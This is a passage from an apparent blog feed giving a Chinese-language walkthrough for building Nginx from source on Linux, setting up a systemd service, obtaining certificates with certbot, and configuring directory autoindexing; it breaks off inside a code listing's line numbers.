href="#mysql-shell-脚本Using-a-password-on-the-command-line-interface-can-be-insecure" class="headerlink" title="mysql shell 脚本Using a password on the command line interface can be insecure"></a>mysql shell 脚本Using a password on the command line interface can be insecure</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;安装步骤如下命令&quot;&gt;&lt;a href=&quot;#安装步骤如下命令&quot; class=&quot;headerlink&quot; title=&quot;安装步骤如下命令&quot;&gt;&lt;/a&gt;安装步骤如下命令&lt;/h2&gt;&lt;p&gt;::: warning mysql安装密码问题&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;安装的时候注意选择</summary>
      
    
    
    
    <category term="数据库" scheme="https://seniortesting.club/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
  </entry>
  
  <entry>
    <title>Nginx Linux安装及其环境配置</title>
    <link href="https://seniortesting.club/posts/2Ix82hIx7y/"/>
    <id>https://seniortesting.club/posts/2Ix82hIx7y/</id>
    <published>2021-03-25T15:16:38.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    <content type="html"><![CDATA[<p>参考：<a href="https://serverfault.com/questions/214242/can-i-hide-all-server-os-info/279389#279389" target="_blank" rel="noopener">修改nginx的Server名称,修改两个文件:ngx_http_header_filter_module.c和nginx.h</a></p><h2 id="docker-setup"><a href="#docker-setup" class="headerlink" title="docker setup"></a>docker setup</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># docker pull nginx</span></span><br><span class="line"><span class="comment"># docker run     -p 80:80     -v /opt/nginx/html:/usr/share/nginx/html     -v  /opt/nginx/config/nginx.conf:/etc/nginx/nginx.conf     -v /opt/nginx/config/conf.d:/etc/nginx/conf.d      -v /opt/nginx/logs:/var/log/nginx     --name nginx     -d nginx</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Nginx安装步骤"><a href="#Nginx安装步骤" class="headerlink" title="Nginx安装步骤"></a>Nginx安装步骤</h2><p>有关各个安装类库的版本要求参见：<a href="https://nginx.org/en/docs/configure.html" target="_blank" rel="noopener">https://nginx.org/en/docs/configure.html</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">$ cd &#x2F;opt</span><br><span class="line">$ sudo mkdir nginx-modules</span><br><span class="line">$ cd nginx-modules</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; zlib安装</span><br><span class="line">$ wget http:&#x2F;&#x2F;zlib.net&#x2F;zlib-1.2.11.tar.gz</span><br><span class="line">$ tar xvf zlib-1.2.11.tar.gz</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ngx-brotli安装</span><br><span class="line">$ apt install git</span><br><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;ngx_brotli</span><br><span class="line">$ cd ngx_brotli &amp;&amp; git submodule update --init --recursive --progress</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; pcre安装</span><br><span class="line">$ cd ..</span><br><span class="line">$ wget https:&#x2F;&#x2F;ftp.pcre.org&#x2F;pub&#x2F;pcre&#x2F;pcre-8.43.tar.gz</span><br><span class="line">$ tar xvf pcre-8.43.tar.gz</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; OpenSSL安装</span><br><span class="line">$ wget https:&#x2F;&#x2F;www.openssl.org&#x2F;source&#x2F;openssl-1.1.1f.tar.gz</span><br><span class="line">$ tar xvf openssl-1.1.1f.tar.gz</span><br><span class="line">$ sudo apt install build-essential -y</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; nginx安装</span><br><span class="line">配置可参考： [Compile from source](https:&#x2F;&#x2F;github.com&#x2F;jukbot&#x2F;setup-nginx-webserver&#x2F;blob&#x2F;master&#x2F;README.md)</span><br><span class="line">$ wget http:&#x2F;&#x2F;nginx.org&#x2F;download&#x2F;nginx-1.18.0.tar.gz</span><br><span class="line">$ tar zxvf nginx-1.18.0.tar.gz</span><br><span class="line">$ cd nginx-1.18.0</span><br><span class="line">$ sudo nano src&#x2F;http&#x2F;ngx_http_header_filter_module.c</span><br><span class="line">$ sudo nano src&#x2F;core&#x2F;nginx.h</span><br><span class="line">$ sudo nano src&#x2F;http&#x2F;ngx_http_special_response.c</span><br><span class="line">$ sudo mkdir &#x2F;var&#x2F;lib&#x2F;nginx</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 运行安装</span><br><span class="line">$ .&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx \</span><br><span class="line">            --sbin-path&#x3D;&#x2F;usr&#x2F;sbin&#x2F;nginx \</span><br><span class="line">            --modules-path&#x3D;&#x2F;usr&#x2F;lib&#x2F;nginx&#x2F;modules \</span><br><span class="line">            --conf-path&#x3D;&#x2F;etc&#x2F;nginx&#x2F;nginx.conf \</span><br><span class="line">            --error-log-path&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log \</span><br><span class="line">            --http-log-path&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log \</span><br><span class="line">            --pid-path&#x3D;&#x2F;run&#x2F;nginx.pid \</span><br><span class="line">            --lock-path&#x3D;&#x2F;var&#x2F;lock&#x2F;nginx.lock \</span><br><span class="line">            --user&#x3D;www-data \</span><br><span class="line">            --group&#x3D;www-data \</span><br><span class="line">            --http-client-body-temp-path&#x3D;&#x2F;var&#x2F;lib&#x2F;nginx&#x2F;body \</span><br><span class="line">            --http-fastcgi-temp-path&#x3D;&#x2F;var&#x2F;lib&#x2F;nginx&#x2F;fastcgi \</span><br><span class="line">            --http-proxy-temp-path&#x3D;&#x2F;var&#x2F;lib&#x2F;nginx&#x2F;proxy \</span><br><span class="line">            --http-scgi-temp-path&#x3D;&#x2F;var&#x2F;lib&#x2F;nginx&#x2F;scgi \</span><br><span class="line">            --http-uwsgi-temp-path&#x3D;&#x2F;var&#x2F;lib&#x2F;nginx&#x2F;uwsgi \</span><br><span class="line">            --with-openssl&#x3D;..&#x2F;nginx-modules&#x2F;openssl-1.1.1f \</span><br><span class="line">            --with-openssl-opt&#x3D;enable-ec_nistp_64_gcc_128 \</span><br><span class="line">            --with-openssl-opt&#x3D;no-nextprotoneg \</span><br><span class="line">            --with-openssl-opt&#x3D;no-weak-ssl-ciphers \</span><br><span class="line">            --with-openssl-opt&#x3D;no-ssl3 \</span><br><span class="line">            --with-pcre&#x3D;..&#x2F;nginx-modules&#x2F;pcre-8.43 \</span><br><span class="line">            --with-pcre-jit \</span><br><span class="line">            --with-zlib&#x3D;..&#x2F;nginx-modules&#x2F;zlib-1.2.11 \</span><br><span class="line">            --with-compat \</span><br><span class="line">            --with-file-aio \</span><br><span class="line">            --with-threads \</span><br><span class="line">            --with-http_addition_module \</span><br><span class="line">            --with-http_auth_request_module \</span><br><span class="line">            --with-http_dav_module \</span><br><span class="line">            --with-http_flv_module \</span><br><span class="line">            --with-http_mp4_module \</span><br><span class="line">            --with-http_gunzip_module \</span><br><span class="line">            --with-http_gzip_static_module \</span><br><span class="line">            --with-http_random_index_module \</span><br><span class="line">            --with-http_realip_module \</span><br><span class="line">            --with-http_slice_module \</span><br><span class="line">            --with-http_ssl_module \</span><br><span class="line">            --with-http_sub_module \</span><br><span class="line">            --with-http_stub_status_module \</span><br><span class="line">            --with-http_v2_module \</span><br><span class="line">            --with-http_secure_link_module \</span><br><span class="line">            --with-mail \</span><br><span class="line">            --with-mail_ssl_module \</span><br><span class="line">            --with-stream \</span><br><span class="line">            --with-stream_realip_module \</span><br><span class="line">            --with-stream_ssl_module \</span><br><span class="line">            --with-stream_ssl_preread_module \</span><br><span class="line">            --with-debug \</span><br><span class="line">            --with-cc-opt&#x3D;&#39;-g -O2 -fPIE -fstack-protector-strong -Wformat -Werror&#x3D;format-security -Wdate-time -D_FORTIFY_SOURCE&#x3D;2&#39; \</span><br><span class="line">            --with-ld-opt&#x3D;&#39;-Wl,-Bsymbolic-functions -fPIE -pie -Wl,-z,relro -Wl,-z,now&#39; \</span><br><span class="line">            --add-module&#x3D;..&#x2F;nginx-modules&#x2F;ngx_brotli</span><br><span class="line"></span><br><span class="line">$ sudo make &amp; sudo make install  #这个操作需要花费十分钟左右 </span><br></pre></td></tr></table></figure><h2 id="安装nginx-service服务"><a href="#安装nginx-service服务" class="headerlink" title="安装nginx.service服务"></a>安装nginx.service服务</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo  nano /lib/systemd/system/nginx.service</span> </span><br><span class="line">[Unit]</span><br><span class="line">Description=A high performance web server and a reverse proxy server</span><br><span class="line">Documentation=man:nginx(8)</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">PIDFile=/run/nginx.pid</span><br><span class="line">ExecStartPre=/usr/sbin/nginx -t -q -g &#x27;daemon on; master_process on;&#x27;</span><br><span class="line">ExecStartPost=/bin/sleep 0.1</span><br><span class="line">ExecStart=/usr/sbin/nginx -g &#x27;daemon on; master_process on;&#x27;</span><br><span class="line">ExecReload=/usr/sbin/nginx -g &#x27;daemon on; master_process on;&#x27; -s reload</span><br><span class="line">ExecStop=-/sbin/start-stop-daemon --quiet --stop --retry QUIT/5 --pidfile /run/nginx.pid</span><br><span class="line">TimeoutStopSec=5</span><br><span class="line">KillMode=mixed</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo systemctl <span class="built_in">enable</span> nginx</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo systemctl restart nginx</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo systemctl status nginx</span></span><br><span class="line"></span><br><span class="line">// 删除默认的nginx网站目录</span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo rm -rf /usr/<span class="built_in">local</span>/nginx/*</span></span><br></pre></td></tr></table></figure><p>遇到异常的报错信息:</p><blockquote><p>nginx.service: Failed to read PID from file <code>/run/nginx.pid</code>: Invalid argument</p></blockquote><p>That warning with the nginx.pid file is a know bug (at least for Ubutnu if not for other distros as well). More details here: <a href="https://bugs.launchpad.net/ubuntu/+source/nginx/+bug/1581864" target="_blank" rel="noopener">https://bugs.launchpad.net/ubuntu/+source/nginx/+bug/1581864</a></p><p>Workaround (on a ssh console, as root, use the commands bellow):</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir /etc/systemd/system/nginx.service.d</span><br><span class="line">printf &quot;[Service]\nExecStartPost=/bin/sleep 0.1\n&quot; &gt; /etc/systemd/system/nginx.service.d/override.conf</span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart nginx </span><br></pre></td></tr></table></figure><h1 id="nginx配置助手"><a href="#nginx配置助手" class="headerlink" title="nginx配置助手"></a>nginx配置助手</h1><ol><li>安装cerbot配置SSL</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install certbot -y</span><br></pre></td></tr></table></figure><ol start="2"><li>配置nginx和SSL</li></ol><p>参考配置文件,每次只需要修改对应的域名(Domain)和目录(Path):<br> <a href="https://www.digitalocean.com/community/tools/nginx#?0.domain=seniortesting.club&0.path=%2Fwww%2Fweb%2Fseniortesting.club&0.document_root=&0.redirect=false&0.email=alterhu2020@gmail.com&0.php=false&0.proxy&0.index=index.html&0.access_log_domain&0.error_log_domain&directory_letsencrypt=%2Fwww%2F_letsencrypt%2F&brotli&log_not_found&symlink=false" target="_blank" rel="noopener">nginxconfig助手</a></p><p>以后每次配置子域名，只需要配置好对应的conf文件然后执行如下命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certbot certonly --webroot -d res.seniortesting.club --email alterhu2020@gmail.com -w &#x2F;www&#x2F;_letsencrypt -n --agree-tos --force-renewal</span><br></pre></td></tr></table></figure><p>::: warning Symlink vhost配置文件<br>注意: 在<code>Symlink vhost</code> 中不要勾选enable。<br>完成以上的配置后不行看任意修改文件<br>:::</p><h2 id="配置静态域名：res-seniortesting-club"><a href="#配置静态域名：res-seniortesting-club" class="headerlink" title="配置静态域名：res.seniortesting.club"></a>配置静态域名：res.seniortesting.club</h2><p>对于静态资源展示，提供了几种方式配置：</p><ul><li><p>简易配置Github风格：（推荐）<a href="https://www.91yunbbs.com/discussion/441/autoindex-html-%E4%B8%80%E8%A1%8C%E9%85%8D%E7%BD%AE%E7%BE%8E%E5%8C%96-nginx-%E7%9B%AE%E5%BD%95%E6%88%90-github-%E9%A3%8E%E6%A0%BC" target="_blank" rel="noopener">autoindex.html - 一行配置美化 nginx 目录成 github 风格。</a></p></li><li><p>复杂配置，比较好看 <a href="https://www.cnblogs.com/linkenpark/p/9184491.html" target="_blank" rel="noopener">ngx-fancyindex</a></p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 代理配置</span><br><span class="line">location &#x2F; &#123;</span><br><span class="line">  proxy_pass http:&#x2F;&#x2F;127.0.0.1:8080;</span><br><span class="line">  include nginxconfig.io&#x2F;proxy.conf;</span><br><span class="line">&#125;</span><br><span class="line"># 静态资源配置</span><br><span class="line">location &#x2F; &#123;</span><br><span class="line">  autoindex on; #开启目录浏览</span><br><span class="line">  autoindex_format html; #以html风格将目录展示在浏览器中</span><br><span class="line">  autoindex_exact_size off; #切换为 off 后，以可读的方式显示文件大小，单位为 KB、MB 或者 GB</span><br><span class="line">  autoindex_localtime on; #以服务器的文件时间作为显示的时间</span><br><span class="line">  charset utf-8,gbk; #展示中文文件名</span><br><span class="line">  # 美化显示</span><br><span class="line">  add_after_body &#x2F;autoindex.html;</span><br><span class="line">  # try_files $uri $uri&#x2F; index.html;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中的<code>autoindex.html</code>内容如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span 